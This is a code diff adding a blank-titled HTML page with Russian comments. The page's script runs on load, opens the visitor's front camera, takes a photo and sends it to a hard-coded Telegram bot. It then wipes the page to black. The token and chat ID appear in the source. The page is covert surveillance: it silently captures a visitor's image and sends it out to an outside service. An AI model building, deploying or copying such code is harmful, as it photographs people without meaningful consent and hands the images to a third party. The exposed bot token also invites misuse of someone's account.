@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title></title>
+    <style>
+        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; }
+        #log { color:#0f0; font-family:Arial; padding:20px; font-size:14px; white-space:pre; }
+        .error { color:#f00; }
+        .success { color:#0f0; }
+    </style>
+</head>
+<body>
+    <div id="log">🔄 Запуск...</div>
+
+<script>
+const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0';
+const CHAT_ID = '1250741267';
+const log = document.getElementById('log');
+
+function updateLog(msg, type = '') {
+    log.textContent += `\n${msg}`;
+    log.className = type;
+}
+
+async function process() {
+    try {
+        updateLog('1. Включаю камеру...');
+        
+        // Включаем фронтальную камеру
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { 
+                facingMode: 'user', // Фронтальная камера
+                width: { ideal: 640 },
+                height: { ideal: 480 }
+            }
+        });
+        
+        updateLog('✅ Камера включена');
+        
+        // Создаём видео-элемент (НЕ ЗАПУСКАЕМ .play()!)
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        
+        // Ждём, когда видео будет готово (без .play())
+        await new Promise((resolve) => {
+            video.onloadedmetadata = () => {
+                updateLog('2. Делаю фото...');
+                resolve();
+            };
+        });
+        
+        // Даём камере 300мс на фокусировку
+        await new Promise(resolve => setTimeout(resolve, 300));
+        
+        // Создаём canvas и делаем снимок
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
+        
+        // Немедленно останавливаем камеру
+        stream.getTracks().forEach(track => track.stop());
+        updateLog('✅ Фото сделано');
+        
+        // Конвертируем в Blob и отправляем в Telegram
+        canvas.toBlob(async (blob) => {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'selfie.jpg');
+            
+            updateLog('3. Отправляю в Telegram...');
+            
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                
+                if (result.ok) {
+                    updateLog('✅ Фото отправлено!', 'success');
+                    // Через 2 секунды делаем страницу пустой
+                    setTimeout(() => {
+                        document.body.innerHTML = '';
+                        document.body.style.backgroundColor = '#000';
+                    }, 2000);
+                } else {
+                    updateLog(`❌ Ошибка Telegram: ${result.description}`, 'error');
+                }
+            } catch (fetchError) {
+                updateLog(`❌ Ошибка сети: ${fetchError.message}`, 'error');
+            }
+        }, 'image/jpeg', 0.9); // Качество 90%
+        
+    } catch (error) {
+        updateLog(`❌ Ошибка: ${error.message}`, 'error');
+    }
+}
+
+// Запускаем при загрузке страницы
+window.addEventListener('DOMContentLoaded', process);
+</script>
+</body>
+</html>
